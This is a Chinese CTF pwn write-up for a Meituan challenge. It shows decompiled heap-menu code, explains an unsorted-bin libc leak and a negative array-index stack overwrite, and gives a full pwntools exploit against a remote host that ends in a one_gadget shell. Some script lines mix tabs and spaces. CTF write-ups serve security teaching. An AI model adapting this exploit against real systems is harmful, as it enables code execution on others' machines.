---
title: mt note
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
- stackoverflow
- index overflow
---

美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。

<!-- more -->

64位菜单，只开了NX

有build、delete、modify、display四个功能

build

```c
int __fastcall build(__int64 a1)
{
  int result; // eax
  unsigned int size; // [rsp+10h] [rbp-10h]
  _BYTE idx[12]; // [rsp+14h] [rbp-Ch]

  *(_QWORD *)idx = (unsigned int)get_idx(a1);   // 最多同时build16个,0~15
  if ( *(_DWORD *)idx == -1 )
    return puts("No free space already");
  printf("Size: ");
  size = get_input();
  if ( !size || size > 0x1FF )
    return puts("Not allowed");
  *(_QWORD *)&idx[4] = malloc(size);
  printf("Content: ");
  read(0, *(void **)&idx[4], size);
  *(_QWORD *)(a1 + 16LL * *(int *)idx) = *(_QWORD *)&idx[4];
  result = size;
  *(_DWORD *)(a1 + 16LL * *(int *)idx + 8) = size;// 有个地方存着size
  return result;
}
```

delete

```c
int __fastcall sub_4013F3(__int64 a1)
{
  unsigned int idx; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  idx = get_input();
  if ( idx > 0x10 )
    return puts("Not allowed");
  if ( !*(_QWORD *)(16LL * idx + a1) )
    return puts("Nothing here");
  free(*(void **)(16LL * idx + a1));
  *(_QWORD *)(16LL * idx + a1) = 0LL;
  *(_DWORD *)(16LL * idx + a1 + 8) = 0;         // 有个小UAF
  return puts("done");
}
```

modify

```c
int __fastcall sub_4014B6(__int64 a1)
{
  int idx; // [rsp+14h] [rbp-Ch]
  void *buf; // [rsp+18h] [rbp-8h]

  printf("Index: ");
  idx = get_input();
  if ( idx > 16 || !*(_QWORD *)(16LL * idx + a1) )
    return puts("Not allowed");
  buf = *(void **)(16LL * idx + a1);
  printf("Content: ");
  return read(0, buf, *(int *)(16LL * idx + a1 + 8));// 只能写size大小，但index可以为负数
}
```

display

```c
int __fastcall sub_401580(__int64 a1)
{
  int result; // eax
  unsigned int idx; // [rsp+14h] [rbp-Ch]

  printf("Index: ");
  idx = get_input();
  if ( idx <= 0x10 && *(_QWORD *)(16LL * idx + a1) )
    result = printf("Content: %s\n", *(const char **)(16LL * idx + a1));
  else
    result = puts("Not allowed");
  return result;
}
```

有个小UAF，释放了一个chunk之后，重新malloc的时候虽然会重新写一些内容，但原有的内容不会清空（如果没有覆盖的话）。

可以先将chunk放入unsorted bin，再次malloc的时候只写入8byte，这样bk处仍保存有unsorted bin头的地址，借此可以泄露libc。

除此之外，modify中存在**下标负溢出**，并且由于堆块指针存储在栈上，因此可以利用下标负溢出改写返回地址，调整寄存器的值后执行one_gadget

```python
from pwn import*
elf=ELF("./note2")
libc=ELF("./libc-2.31.so")
#p=process("./note2")
p=remote('39.106.78.22',35569)
context.log_level='debug'

def build(size,content):
	p.recvuntil("5. leave\n")
	p.sendline('1')
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.send(content)

def display(idx):
	p.recvuntil("5. leave\n")
	p.sendline('2')
	p.recvuntil("Index: ")
 	p.sendline(str(idx))
	p.recvuntil("Content: ")

def modify(idx,content):
	p.recvuntil("5. leave\n")
	p.sendline('3')
	p.recvuntil("Index: ")
 	p.sendline(str(idx))
 	p.recvuntil("Content: ")
 	p.send(content)

def delete(idx):
 	p.recvuntil("5. leave\n")
	p.sendline('4')
	p.recvuntil("Index: ")
 	p.sendline(str(idx))
 	p.recvuntil("done")

def debug():
 	gdb.attach(p,'b* 0x401714')
 	pause()


build(0x80,'a'*0x20)#idx0
build(0x80,'c'*0x20)#idx1
build(0x80,'a'*0x20)#idx2

for i in range(7):#3,4,5,6,7,8,9
	build(0x80,'b'*0x20)
for i in range(7):
	delete(3+i)

delete(1)


for i in range(7):#1,3,4,5,6,7,8
	build(0x80,'a'*0x8)

build(0x30,'f'*0x8)#9

display(9)


leak=u64(p.recvline()[8:14].ljust(8,'\x00'))
unsort=leak-0x80
mhook=unsort-96-0x10
libcbase=mhook-libc.symbols['__malloc_hook']

one_gadget = [0xe3afe,0xe3b01,0xe3b04]
free_hook=libcbase+libc.symbols['__free_hook']
log.info("unsorted bin: "+hex(unsort))
log.info("libcbase : "+hex(libcbase))
log.info("malloc hook : "+hex(mhook))
log.info("free hook : "+hex(free_hook))

#debug()
#pop 0x00000000004017ac
pop_addr= 0x00000000004017ac
#modify(-6,p64(0)+p64(libcbase+one_gadget[0]))
#pop r12 r15 to satisfy one_gadget
modify(-6,p64(0)+p64(pop_addr)+p64(0)+p64(0)+p64(0)+p64(0)+p64(libcbase+one_gadget[0]))


p.interactive()

```